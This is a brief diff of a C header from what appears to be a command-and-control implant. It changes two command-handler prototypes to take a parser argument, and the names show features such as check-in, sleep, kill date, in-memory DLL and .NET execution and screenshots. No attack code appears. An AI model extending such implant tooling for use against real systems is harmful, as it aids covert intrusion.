@@ -143,7 +143,7 @@ typedef struct
 
 VOID CommandDispatcher( VOID );
 
-VOID CommandCheckin( VOID );
+VOID CommandCheckin( PPARSER Parser );
 VOID CommandSleep( PPARSER DataArgs );
 BOOL InWorkingHours( );
 BOOL ReachedKillDate( );
@@ -159,7 +159,7 @@ VOID CommandSpawnDLL( PPARSER DataArgs );
 VOID CommandInlineExecute(PPARSER DataArgs);
 VOID CommandDotnet( PPARSER Parser );
 VOID CommandAssemblyInlineExecute( PPARSER DataArgs );
-VOID CommandAssemblyListVersion( VOID );
+VOID CommandAssemblyListVersion( PPARSER Parser );
 VOID CommandScreenshot( PPARSER Parser );
 
 // Modules
